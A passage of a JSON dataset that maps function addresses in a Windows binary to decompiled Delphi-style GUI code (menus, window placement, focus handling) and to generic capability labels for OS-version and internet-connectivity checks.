            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043f464(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) {\n        sub.user32.dll_SendMessageA(*(in_EAX + 0x29c), 0x229, 0, 0);\n        uVar1 = fcn.0044d264();\n    }\n    return uVar1;\n}\n",
        "token_count": 122
    },
    "0043f498": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043f498(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) && (iVar1 = fcn.00443d74(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.00443d60();\n            if (*(iVar2 + 0x277) == '\\x01') {\n                iVar3 = iVar3 + 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return iVar3;\n}\n",
        "token_count": 181
    },
    "0043f4e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043f4e4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) && (iVar1 = fcn.00443d74(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.00443d60();\n            if ((*(iVar2 + 0x277) == '\\x01') && (param_2 = param_2 + -1,  param_2 < 0)) {\n                return iVar2;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 198
    },
    "0043f648": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f648(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (param_2 != *(in_EAX + 0x277)) {\n        if (((param_2 != '\\0') || (*(in_EAX + 0x277) != '\\x03')) && ((param_2 != '\\x03' || (*(in_EAX + 0x277) != '\\0')))\n           ) {\n            if ((param_2 == '\\x01') && (*(in_EAX + 0x9e) == '\\0')) {\n                puStack20 = 0x43f6fd;\n                fcn.0043fb50();\n            }\n            bVar3 = (*(in_EAX + 7) & 0x10) == 0;\n            if (bVar3) {\n                puStack20 = 0x43f71c;\n                fcn.00459908();\n            }\n            uStack24 = 0x43f7b0;\n            uStack28 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe4;\n            puStack20 = &stack0xfffffffc;\n            if (bVar3) {\n                puStack20 = &stack0xfffffffc;\n                (**(*in_EAX + 0xb0))();\n            }\n            cVar1 = *(in_EAX + 0x277);\n            *(in_EAX + 0x277) = param_2;\n            if (((param_2 == '\\x02') || (cVar1 == '\\x02')) && (*(in_EAX + 0x1d9) == '\\0')) {\n                fcn.0043fc88();\n                fcn.00450978();\n            }\n            if (bVar3) {\n                fcn.00455128();\n            }\n            if (param_2 == '\\x01') {\n                fcn.0043e37c();\n            }\n            *in_FS_OFFSET = uStack28;\n            puStack20 = 0x43f7b7;\n            if (bVar3) {\n                uStack24 = 0x43f7af;\n                fcn.00459908();\n            }\n            return;\n        }\n        *(in_EAX + 0x277) = param_2;\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            puStack20 = 0x43f6a2;\n            cVar1 = fcn.00458874();\n            if (cVar1 != '\\0') {\n                puStack20 = 0x213;\n                uStack24 = 0;\n                uStack28 = 0;\n                uVar2 = fcn.00458568(*((*(in_EAX + 0x277) == '\\x03') * 4 + 0x49056c), 0, 0);\n                sub.user32.dll_SetWindowPos(uVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 702
    },
    "0043f7bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043f7bc(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    if ((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) {\n        iVar3 = 0;\n        if (*(in_EAX + 0x290) != NULL) {\n            iVar3 = (**(**(in_EAX + 0x290) + 0x34))();\n        }\n        uVar4 = 0;\n        if (*(in_EAX + 0x2a0) != 0) {\n            uVar4 = fcn.004349c4();\n        }\n        uVar1 = fcn.00458568();\n        iVar2 = sub.user32.dll_GetMenu(uVar1);\n        sub.user32.dll_SendMessageA(*(in_EAX + 0x29c), 0x230, iVar3, uVar4);\n        if (iVar3 != iVar2) {\n            uVar4 = fcn.00458568();\n            sub.user32.dll_DrawMenuBar(uVar4);\n        }\n    }\n    return;\n}\n",
        "token_count": 271
    },
    "0043f884": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043f884(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint *arg_ch;\n    uint arg_8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    if ((param_2 != 0) && (iVar2 = fcn.00443d74(),  -1 < iVar2 + -1)) {\n        do {\n            var_4h = iVar2;\n            iVar2 = fcn.00443d60();\n            if ((param_2 == *(iVar2 + 0x290)) && (iVar2 = fcn.00443d60(),  in_EAX != iVar2)) {\n                var_ch = *(param_2 + 8);\n                var_8h._0_1_ = 0xb;\n                arg_ch = &var_ch;\n                arg_8h = 0;\n                fcn.00407550();\n                fcn.0040db28(arg_8h, arg_ch);\n                fcn.00404ec4();\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != 0);\n    }\n    if (*(in_EAX + 0x290) != 0) {\n        fcn.00438238();\n    }\n    if (((*(in_EAX + 0x1c) & 8) != 0) || ((param_2 != 0 && ((*(param_2 + 0x1c) & 8) != 0)))) {\n        param_2 = 0;\n    }\n    *(in_EAX + 0x290) = param_2;\n    if ((param_2 == 0) || ((fcn.00420018(),  (*(in_EAX + 0x1c) & 0x10) == 0 && (*(in_EAX + 0x271) == '\\x03')))) {\n        cVar1 = fcn.00458874();\n        if (cVar1 != '\\0') {\n            uVar4 = fcn.00458568(0);\n            sub.user32.dll_SetMenu(uVar4);\n        }\n    }\n    else if (((*(*(in_EAX + 0x290) + 0x5c) == '\\0') && (*(in_EAX + 0x277) != '\\x01')) ||\n            ((*(in_EAX + 0x1c) & 0x10) != 0)) {\n        cVar1 = fcn.00458874();\n        if (cVar1 != '\\0') {\n            iVar2 = (**(**(in_EAX + 0x290) + 0x34))();\n            arg_8h = fcn.00458568();\n            iVar3 = sub.user32.dll_GetMenu();\n            if (iVar2 != iVar3) {\n                (**(**(in_EAX + 0x290) + 0x34))();\n                arg_8h = fcn.00458568();\n                sub.user32.dll_SetMenu();\n            }\n            fcn.00458568();\n            fcn.00438238();\n        }\n    }\n    else if ((*(in_EAX + 0x277) != '\\x01') && (cVar1 = fcn.00458874(),  cVar1 != '\\0')) {\n        uVar4 = fcn.00458568(0);\n        sub.user32.dll_SetMenu(uVar4);\n    }\n    if (*(in_EAX + 0x276) != '\\0') {\n        fcn.00440f40();\n    }\n    fcn.0043f7bc();\n    if (((*(in_EAX + 0x298) != 0) && ((*(in_EAX + 0x1c) & 0x10) != 0)) && (*(in_EAX + 0x30) != 0)) {\n        uVar4 = fcn.00458568(0, 0, 0, 0, 0, 0x37);\n        sub.user32.dll_SetWindowPos(uVar4);\n        fcn.00451abc(0);\n        fcn.00451abc(0);\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1027
    },
    "0043fac0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043fac0(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x32c) == 0) {\n        uVar1 = fcn.00404620();\n        *(in_EAX + 0x32c) = uVar1;\n    }\n    return *(in_EAX + 0x32c);\n}\n",
        "token_count": 90
    },
    "0043fae8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043fae8(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x338) == 0) {\n        uVar1 = fcn.00404620();\n        *(in_EAX + 0x338) = uVar1;\n    }\n    return *(in_EAX + 0x338);\n}\n",
        "token_count": 88
    },
    "0043fc20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0043fc20(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + 0x2a4) & 0xffffff00 | **(in_EAX + 0x2a4) != 0;\n}\n",
        "token_count": 61
    },
    "0043fd24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043fd24(uint param_1, uint8_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (((param_2 != *(in_EAX + 0x273)) && (*(in_EAX + 0x273) = param_2,  (*(in_EAX + 0x1c) & 0x10) == 0)) &&\n       (*(in_EAX + 0x1da) != '\\0')) {\n        uVar1 = fcn.00458568(*(param_2 * 4 + 0x490574));\n        sub.user32.dll_ShowWindow(uVar1);\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "0043fd64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043fd64(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iStack20;\n    \n    if ((*(in_EAX + 0x279) != '\\0') && (*(*0x497c1c + 0x44) != 0)) {\n        iVar10 = 0;\n        if (*(in_EAX + 0x279) == '\\x02') {\n            iVar10 = fcn.0043f564();\n            iVar10 = *(iVar10 + 4);\n        }\n        else if ((*(in_EAX + 0x279) == '\\x03') && (*(*0x497c20 + 0x68) != 0)) {\n            iVar10 = fcn.0043f564();\n            iVar10 = *(iVar10 + 4);\n        }\n        else if (*(in_EAX + 0x279) == '\\x01') {\n            iVar10 = fcn.00444c40();\n            iVar10 = *(iVar10 + 4);\n        }\n        iVar1 = fcn.0043f564();\n        iVar1 = *(iVar1 + 4);\n        iStack20 = fcn.00443d44();\n        if (-1 < iStack20 + -1) {\n            do {\n                iVar2 = fcn.00443d30();\n                if (((*(iVar2 + 4) == iVar10) && (iVar10 != iVar1)) && (iVar2 = fcn.00443d44(),  -1 < iVar2 + -1)) {\n                    iVar11 = 0;\n                    do {\n                        iVar3 = fcn.00443d30(iVar10, iVar1, iVar11);\n                        if (*(iVar3 + 4) == iVar1) {\n                            if (*(in_EAX + 0x9e) == '\\x04') {\n                                iVar3 = in_EAX[0x13];\n                                fcn.00443d30(iVar3, in_EAX[0x12]);\n                                iVar4 = fcn.00443a10();\n                                fcn.00443d30(iVar4);\n                                iVar5 = fcn.004439f4();\n                                uVar6 = iVar5 - iVar3;\n                                iVar3 = uVar6 >> 1;\n                                if (iVar3 < 0) {\n                                    iVar3 = iVar3 + ((uVar6 & 1) != 0);\n                                }\n                                fcn.00443d30(iVar4 + iVar3);\n                                fcn.004439dc();\n                                fcn.00443d30();\n                                fcn.00443a28();\n                                (**(*in_EAX + 0x88))();\n                            }\n                            else if (*(in_EAX + 0x9e) == '\\x06') {\n                                iVar3 = in_EAX[0x13];\n                                fcn.00443d30(iVar3, in_EAX[0x12]);\n                                iVar4 = fcn.00443a10();\n                                fcn.00443d30(iVar4);\n                                iVar5 = fcn.004439f4();\n                                uVar6 = iVar5 - iVar3;\n                                iVar3 = uVar6 >> 1;\n                                if (iVar3 < 0) {\n                                    iVar3 = iVar3 + ((uVar6 & 1) != 0);\n                                }\n                                fcn.00443d30(iVar4 + iVar3);\n                                fcn.004439dc();\n                                fcn.00443d30();\n                                fcn.00443a28();\n                                (**(*in_EAX + 0x88))();\n                            }\n                            else {\n                                fcn.00443d30(iVar10, iVar1, iVar11);\n                                iVar3 = fcn.004439dc();\n                                iVar4 = fcn.0043df0c();\n                                fcn.00443d30();\n                                iVar5 = fcn.004439dc();\n                                fcn.00443d30();\n                                iVar7 = fcn.004439dc();\n                                fcn.00443d30();\n                                iVar8 = fcn.00443a28();\n                                if (iVar7 + iVar8 < in_EAX[0x12] + ((iVar3 + iVar4) - iVar5)) {\n                                    fcn.00443d30();\n                                    fcn.004439dc();\n                                    fcn.00443d30();\n                                    fcn.00443a28();\n                                }\n                                fcn.00443d30();\n                                iVar3 = fcn.00443a10();\n                                iVar4 = fcn.0043df2c();\n                                iVar3 = iVar3 + iVar4;\n                                fcn.00443d30();\n                                iVar4 = fcn.00443a10();\n                                fcn.00443d30();\n                                iVar5 = fcn.00443a10();\n                                fcn.00443d30();\n                                iVar7 = fcn.004439f4();\n                                if (iVar5 + iVar7 < (iVar3 - iVar4) + in_EAX[0x13]) {\n                                    fcn.00443d30();\n                                    uVar9 = fcn.00443a10();\n                                    fcn.00443d30(uVar9);\n                                    fcn.004439f4();\n                                }\n                                (**(*in_EAX + 0x88))(in_EAX[0x13], in_EAX[0x12]);\n                            }\n                        }\n                        iVar11 = iVar11 + 1;\n                        iVar2 = iVar2 + -1;\n                    } while (iVar2 != 0);\n                }\n                iStack20 = iStack20 + -1;\n            } while (iStack20 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 1295
    },
    "00440718": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440718(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *extraout_EDX;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff20;\n    uint uStack208;\n    uint uStack204;\n    uchar *puStack200;\n    uint var_b4h;\n    uint var_b0h;\n    uint32_t var_a8h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack200 = &stack0xfffffffc;\n    uStack204 = 0x440841;\n    uStack208 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack208;\n    if ((*(in_EAX + 0x277) == '\\x01') && ((*(in_EAX + 0x1c) & 0x10) == 0)) {\n        if ((*(*0x497c1c + 0x44) == 0) || (puStack200 = &stack0xfffffffc,  *(*(*0x497c1c + 0x44) + 0x29c) == 0)) {\n            puStack200 = &stack0xfffffffc;\n            fcn.00407550();\n            fcn.0040daec();\n            fcn.00404ec4();\n            param_2 = extraout_EDX;\n        }\n        var_24h = param_2 + 0x13;\n        var_20h = *param_2;\n        var_1ch = *0x4957f8;\n        var_18h = param_2[3];\n        var_14h = param_2[4];\n        var_10h = param_2[5];\n        var_ch = param_2[6];\n        var_8h = param_2[1];\n        var_4h = param_2[8];\n        in_stack_ffffff20 = *(*(*0x497c1c + 0x44) + 0x29c);\n        uVar1 = sub.user32.dll_SendMessageA(in_stack_ffffff20, 0x220, 0, &var_24h);\n        *(in_EAX + 0x1b4) = uVar1;\n        *(in_EAX + 0x358) = *(in_EAX + 0x358) | 0x10;\n    }\n    else {\n        puVar3 = &var_b0h;\n        for (iVar2 = 0x23; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = *param_2;\n            param_2 = param_2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        var_a8h = var_a8h & 0xfff7ffff;\n        fcn.00454a74();\n        *(in_EAX + 0x358) = *(in_EAX + 0x358) & 0xef;\n    }\n    fcn.004433a0();\n    *in_FS_OFFSET = in_stack_ffffff20;\n    fcn.00405530(0x440848);\n    return;\n}\n",
        "token_count": 760
    },
    "00440894": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00440894(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    code *pcStack32;\n    uint *puStack28;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x1b4) != 0) {\n        if ((*(in_EAX + 0x32c) != 0) && (var_14h = *(*(in_EAX + 0x32c) + 8),  -1 < var_14h + -1)) {\n            var_8h = 0;\n            var_4h = in_EAX;\n            if ((*(in_EAX + 0x55) & 0x20) != 0) {\n                puStack28 = 0x4408ef;\n                fcn.00419888();\n                puStack28 = 0x4408f6;\n                fcn.00459908();\n            }\n            pcStack32 = 0x44094c;\n            uStack36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffdc;\n            puStack28 = &stack0xfffffffc;\n            piVar1 = fcn.00419888();\n            (**(*piVar1 + 0xb0))();\n            *in_FS_OFFSET = uStack36;\n            puStack28 = 0x440953;\n            if ((*(var_4h + 0x55) & 0x20) != 0) {\n                pcStack32 = 0x440944;\n                fcn.00419888();\n                pcStack32 = 0x44094b;\n                fcn.00459908();\n            }\n            return;\n        }\n        var_10h = *(in_EAX + 0x1b4);\n        var_ch._0_1_ = (*(in_EAX + 0x55) & 0x20) != 0;\n        puStack28 = &fcn.00440894::var_10h;\n        pcStack32 = fcn.00440850;\n        uStack36 = 0x440986;\n        uStack36 = sub.kernel32.dll_GetCurrentThreadId_1();\n        sub.user32.dll_EnumThreadWindows();\n    }\n    fcn.00454eec();\n    return;\n}\n",
        "token_count": 550
    },
    "00440b6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00440b6c(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar4;\n    uint var_4h;\n    \n    *0x49050c = *0x49050c + 1;\n    if (*(in_EAX + 0x298) == 0) {\n        if (in_EAX == param_2) {\n            *(in_EAX + 0x268) = 0;\n        }\n        else {\n            *(in_EAX + 0x268) = param_2;\n        }\n    }\n    *(*0x497c20 + 100) = param_2;\n    *(*0x497c20 + 0x68) = in_EAX;\n    fcn.004199cc();\n    fcn.00419904();\n    cVar2 = fcn.004047dc();\n    if (cVar2 == '\\0') {\n        *(*0x497c20 + 0x6c) = 0;\n    }\n    else {\n        *(*0x497c20 + 0x6c) = in_EAX;\n        fcn.004199cc();\n        fcn.00419904();\n    }\n    if ((*(param_2 + 0x54) & 0x20) != 0) {\n        return 0;\n    }\n    *(param_2 + 0x54) = *(param_2 + 0x54) | *0x440e0c;\n    iVar4 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (in_EAX != *(*0x497c20 + 0x78)) {\n        if (*(*0x497c20 + 0x78) != 0) {\n            fcn.00458568();\n            *(*0x497c20 + 0x78) = 0;\n            cVar2 = fcn.0043ba2c();\n            if (cVar2 == '\\0') {\n                fcn.00404f70();\n                return 0;\n            }\n        }\n        *(*0x497c20 + 0x78) = in_EAX;\n        fcn.00458568();\n        cVar2 = fcn.0043ba2c();\n        if (cVar2 == '\\0') {\n            fcn.00404f70();\n            return 0;\n        }\n    }\n    if (*(in_EAX + 0x26c) == 0) {\n        *(in_EAX + 0x26c) = in_EAX;\n    }\n    if (*(in_EAX + 0x26c) != param_2) {\n        while ((*(in_EAX + 0x26c) != 0 && (cVar2 = fcn.004543c0(),  cVar2 == '\\0'))) {\n            fcn.00458568();\n            *(in_EAX + 0x26c) = *(*(in_EAX + 0x26c) + 0x30);\n            cVar2 = fcn.0043ba2c();\n            if (cVar2 == '\\0') {\n                fcn.00404f70();\n                return 0;\n            }\n        }\n        while (iVar4 = param_2,  *(in_EAX + 0x26c) != param_2) {\n            do {\n                iVar3 = iVar4;\n                iVar4 = *(iVar3 + 0x30);\n            } while (iVar4 != *(in_EAX + 0x26c));\n            *(in_EAX + 0x26c) = iVar3;\n            fcn.00458568();\n            cVar2 = fcn.0043ba2c();\n            if (cVar2 == '\\0') {\n                fcn.00404f70();\n                return 0;\n            }\n        }\n        piVar1 = *(param_2 + 0x30);\n        if ((*(param_2 + 0x1c) & 0x10) == 0) {\n            for (; piVar1 != NULL; piVar1 = piVar1[0xc]) {\n                cVar2 = fcn.004047dc();\n                if (cVar2 != '\\0') {\n                    (**(*piVar1 + 0xdc))();\n                }\n            }\n        }\n        fcn.00451abc(param_2);\n        if ((*(in_EAX + 0x2c4) != 0) && (*(in_EAX + 0x2c4) != param_2)) {\n            iVar4 = 0;\n            fcn.00451abc(0);\n        }\n    }\n    *in_FS_OFFSET = iVar4;\n    *(param_2 + 0x54) = ~*0x440e0c & *(param_2 + 0x54);\n    return param_2;\n}\n",
        "token_count": 1094
    },
    "00440e14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00440e14(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if ((((*(in_EAX + 0x268) == 0) || (*(in_EAX + 0x298) != 0)) && (*(in_EAX + 0x30) != 0)) && (*(in_EAX + 0x298) == 0))\n    {\n        fcn.00458998(0, 1);\n    }\n    uVar1 = fcn.00458568();\n    sub.user32.dll_SetFocus(uVar1);\n    iVar2 = fcn.00458568();\n    iVar3 = sub.user32.dll_GetFocus();\n    if (iVar2 == iVar3) {\n        fcn.00451abc(0);\n    }\n    return;\n}\n",
        "token_count": 191
    },
    "00440e8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440e8c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x276) = param_2;\n    if (*(in_EAX + 0x2c4) != 0) {\n        fcn.00451abc(0);\n    }\n    if (param_2 != '\\0') {\n        if ((*(in_EAX + 0x268) == 0) && ((*(in_EAX + 0x1c) & 0x10) == 0)) {\n            fcn.00458998(0, 1);\n            fcn.00440a40();\n        }\n        fcn.00440f40();\n        fcn.00440e14();\n    }\n    return;\n}\n",
        "token_count": 179
    },
    "00440ef0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440ef0(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(in_EAX + 0x276) != '\\0') && (*(in_EAX + 0x268) != 0)) {\n        fcn.00451abc(param_2);\n    }\n    if (*(in_EAX + 0x277) == '\\x02') {\n        iVar1 = fcn.0043f464();\n        if (iVar1 != 0) {\n            fcn.0043f464();\n            fcn.00440ef0();\n        }\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00440f40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440f40(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((((*(in_EAX + 0x358) & 8) == 0) && (*(*0x497c1c + 0x44) != 0)) && (*(*(*0x497c1c + 0x44) + 0x290) != 0)) &&\n       ((in_EAX != *(*0x497c1c + 0x44) && ((*(in_EAX + 0x277) == '\\x01' || (*(*(*0x497c1c + 0x44) + 0x277) != '\\x02'))))\n       )) {\n        if (param_2 == '\\0') {\n            fcn.00438880();\n        }\n        else {\n            fcn.00438864();\n        }\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "004410d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004410d0(uint param_1, uchar *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uchar *puStack80;\n    int32_t iStack76;\n    uchar *puStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uchar *var_8h;\n    int32_t *var_4h;\n    \n    puStack44 = 0x4410ec;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.00425350();\n    uStack48 = 0x4412cb;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x44110b;\n    puStack44 = &stack0xfffffffc;\n    fcn.0042571c();\n    uStack60 = 0x4412a8;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack68 = var_8h;\n    puStack72 = 0x441122;\n    puStack56 = &stack0xfffffffc;\n    var_ch = sub.gdi32.dll_SaveDC();\n    iStack76 = 0x44125b;\n    puStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    iVar3 = fcn.00447dac();\n    cVar1 = fcn.00448098();\n    if 